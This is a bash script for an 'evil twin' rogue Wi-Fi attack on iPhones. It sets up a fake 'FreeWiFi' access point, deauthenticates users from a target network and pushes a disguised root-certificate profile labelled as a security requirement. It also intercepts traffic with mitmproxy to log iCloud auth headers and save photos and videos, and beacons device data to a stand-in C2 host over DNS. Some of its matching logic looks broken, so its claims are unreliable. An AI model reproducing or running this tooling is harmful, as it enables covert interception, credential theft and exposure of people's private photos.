#!/bin/bash
# =====================================================
# iOS EVIL TWIN + iCLOUD PHOTO EXFIL (Silent)
# iOS 15–18 | Auto CA | DNS C2 | Photos, Videos, Messages
# =====================================================

set -e
INTERFACE="wlan0"
AP_SSID="FreeWiFi"
AP_CHANNEL="6"
GATEWAY_IP="10.0.0.1"
MITM_PORT="8080"
WEBROOT="/var/www/html"
CERT_DIR="/root/.mitmproxy"
LOG_DIR="/var/log/evil_twin"
PHOTO_DIR="$LOG_DIR/photos"
DNS_DOMAIN="c2.evil.local"

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'; NC='\033[0m'
log() { echo -e "${GREEN}[+] $1${NC}"; }

[[ $EUID -ne 0 ]] && { echo "Run as root"; exit 1; }

# --- DEPS ---
for pkg in hostapd dnsmasq mitmproxy aircrack-ng apache2 bind9 curl; do
    command -v $pkg >/dev/null || apt install -y $pkg
done

mkdir -p $WEBROOT/{ca,payload} $LOG_DIR $PHOTO_DIR $CERT_DIR
cp $CERT_DIR/mitmproxy-ca-cert.* $WEBROOT/ca/ 2>/dev/null || true

# --- CLEANUP ---
cleanup() {
    log "Stopping..."
    systemctl stop hostapd dnsmasq apache2 named 2>/dev/null || true
    pkill mitmdump aireplay-ng || true
    airmon-ng stop ${INTERFACE}mon 2>/dev/null || true
    iptables -t nat -F; iptables -t nat -X
}
trap cleanup EXIT

# --- 1. MONITOR MODE ---
airmon-ng start $INTERFACE
MON_INTERFACE="${INTERFACE}mon"

# --- 2. HOSTAPD ---
cat > /etc/hostapd/hostapd.conf << EOF
interface=$INTERFACE
driver=nl80211
ssid=$AP_SSID
hw_mode=g
channel=$AP_CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF
hostapd /etc/hostapd/hostapd.conf > $LOG_DIR/hostapd.log 2>&1 &

# --- 3. NETWORK ---
ip addr flush dev $INTERFACE
ip addr add $GATEWAY_IP/24 dev $INTERFACE
ip link set $INTERFACE up

cat > /etc/dnsmasq.conf << EOF
interface=$INTERFACE
dhcp-range=10.0.0.100,10.0.0.200,12h
dhcp-option=3,$GATEWAY_IP
dhcp-option=6,$GATEWAY_IP
address=/#/$GATEWAY_IP
EOF
dnsmasq -C /etc/dnsmasq.conf -d > $LOG_DIR/dnsmasq.log 2>&1 &

echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 80 -j REDIRECT --to-port $MITM_PORT
iptables -t nat -A PREROUTING -i $INTERFACE -p tcp --dport 443 -j REDIRECT --to-port $MITM_PORT

# --- 4. DNS TUNNELING C2 ---
cat > /etc/bind/db.$DNS_DOMAIN << EOF
\$TTL 60
@ IN SOA ns1.$DNS_DOMAIN. root.$DNS_DOMAIN. (1 1H 15M 1D 1D)
@ IN NS ns1.$DNS_DOMAIN.
ns1 IN A $GATEWAY_IP
* IN A $GATEWAY_IP
EOF
named -g -c /etc/bind/named.conf.local > $LOG_DIR/dns_c2.log 2>&1 &

# --- 5. iOS .mobileconfig (Auto-Install CA) ---
cat > $WEBROOT/ca/ios_profile.mobileconfig << EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key><string>com.apple.security.root</string>
            <key>PayloadVersion</key><integer>1</integer>
            <key>PayloadIdentifier</key><string>com.evilwifi.root</string>
            <key>PayloadUUID</key><string>11111111-2222-3333-4444-555555555555</string>
            <key>PayloadDisplayName</key><string>WiFi Security Certificate</string>
            <key>PayloadDescription</key><string>Required for secure connection</string>
            <key>PayloadContent</key>
            <data>
$(openssl base64 -in $CERT_DIR/mitmproxy-ca-cert.pem | tr -d '\n')
            </data>
        </dict>
    </array>
    <key>PayloadRemovalDisallowed</key><false/>
    <key>PayloadType</key><string>Configuration</string>
    <key>PayloadVersion</key><integer>1</integer>
    <key>PayloadIdentifier</key><string>com.evilwifi.profile</string>
    <key>PayloadUUID</key><string>99999999-8888-7777-6666-555555555555</string>
    <key>PayloadDisplayName</key><string>FreeWiFi Security</string>
</dict>
</plist>
EOF

# --- 6. iOS EXPLOIT PAGE (Auto-CA + Trigger iCloud Sync + Exfil) ---
cat > $WEBROOT/index.html << 'EOF'
<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Free WiFi</title>
  <style>
    body { font-family: -apple-system; text-align: center; padding: 50px; background: #f8f8f8; }
    button { padding: 15px 30px; font-size: 18px; background: #007AFF; color: white; border: none; border-radius: 10px; }
  </style>
</head>
<body>
  <h1>Free WiFi</h1>
  <p>Installing security profile...</p>
  <script>
    // 1. Auto-install CA
    setTimeout(() => { location.href = "/ca/ios_profile.mobileconfig"; }, 1000);

    // 2. Trigger iCloud Photo Sync
    setTimeout(() => {
      // Force Photos app to sync
      fetch("https://p73-content.icloud.com/sync", {method: "POST", credentials: "include"});
      // Trigger backup
      location.href = "photos-redirect://";
    }, 5000);

    // 3. Exfil device info via DNS
    setTimeout(() => {
      new Image().src = "http://" + btoa("iPhone:" + navigator.platform + "|Photos:" + (navigator.maxTouchPoints > 0)).replace(/=/g,'') + ".c2.evil.local";
    }, 3000);
  </script>
</body>
</html>
EOF

# --- 7. MITMPROXY (Capture iCloud Photos + Auth) ---
cat > /tmp/ios_photo_exfil.py << 'EOF'
from mitmproxy import http
import os, re, json, base64

PHOTO_DIR = "/var/log/evil_twin/photos"
os.makedirs(PHOTO_DIR, exist_ok=True)

def request(flow: http.HTTPFlow):
    # Capture iCloud auth tokens
    if "icloud.com" in flow.request.host and "X-Apple-I-MD" in flow.request.headers:
        with open(f"{PHOTO_DIR}/tokens.log", "a") as f:
            f.write(f"[AUTH] {flow.request.headers}\n")

    # Log photo upload URLs
    if "p*-content.icloud.com" in flow.request.host and flow.request.method == "PUT":
        url = flow.request.url
        fname = re.search(r"/([^/]+\.(jpg|heic|mov|png))", url)
        if fname:
            fname = fname.group(1)
            with open(f"{PHOTO_DIR}/upload_urls.txt", "a") as f:
                f.write(f"{url} -> {fname}\n")

def response(flow: http.HTTPFlow):
    # Save photo/video binaries
    if "p*-content.icloud.com" in flow.request.host:
        ct = flow.response.headers.get("content-type", "")
        if ct.startswith(("image/", "video/")) or "octet-stream" in ct:
            fname = flow.request.url.split("/")[-1].split("?")[0]
            if not fname: fname = f"photo_{hash(flow.request.url)}.bin"
            path = f"{PHOTO_DIR}/{fname}"
            with open(path, "wb") as f:
                f.write(flow.response.content)
            print(f"[PHOTO SAVED] {path}")
EOF

mitmdump --mode transparent --showhost -s /tmp/ios_photo_exfil.py -p $MITM_PORT > $LOG_DIR/mitmproxy.log 2>&1 &

# --- 8. AUTO-DOWNLOAD PHOTOS (Background) ---
cat > /usr/local/bin/download_photos.sh << 'EOF'
#!/bin/bash
LOG="/var/log/evil_twin/photos/upload_urls.txt"
while sleep 10; do
    if [[ -f "$LOG" ]]; then
        grep -E '\.(jpg|heic|mov|png)' "$LOG" | while read url fname; do
            fname=$(echo "$fname" | tr -d ' ')
            [[ -f "/var/log/evil_twin/photos/$fname" ]] && continue
            curl -s -k -o "/var/log/evil_twin/photos/$fname" "$url" && echo "[DOWNLOADED] $fname"
        done
    fi
done
EOF
chmod +x /usr/local/bin/download_photos.sh
/usr/local/bin/download_photos.sh > $LOG_DIR/photo_download.log 2>&1 &

# --- 9. DNS C2 LISTENER ---
cat > /usr/local/bin/ios_dns_listener.py << 'EOF'
#!/usr/bin/env python3
import socket, base64
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.bind(('0.0.0.0', 53))
print("DNS C2 Active...")
while True:
    data, addr = s.recvfrom(1024)
    try:
        q = ''.join(chr(b) for b in data[12:] if 32 <= b <= 126)
        if "c2.evil.local" in q:
            b64 = q.split('.')[0]
            print(f"[iOS DNS] {base64.b64decode(b64 + '==').decode()}")
    except: pass
EOF
chmod +x /usr/local/bin/ios_dns_listener.py
/usr/local/bin/ios_dns_listener.py > $LOG_DIR/ios_dns.log 2>&1 &

# --- 10. LAUNCH ---
apache2ctl start
log "iOS PHOTO EXFIL TWIN LIVE!"
echo
echo "   SSID: $AP_SSID"
echo "   Portal: http://$GATEWAY_IP"
echo "   Photos → $PHOTO_DIR/"
echo "   Tokens → $PHOTO_DIR/tokens.log"
echo
read -p "Target BSSID (deauth): " BSSID
[[ $BSSID ]] && aireplay-ng --deauth 0 -a $BSSID $MON_INTERFACE &
log "Press Ctrl+C to stop"
wait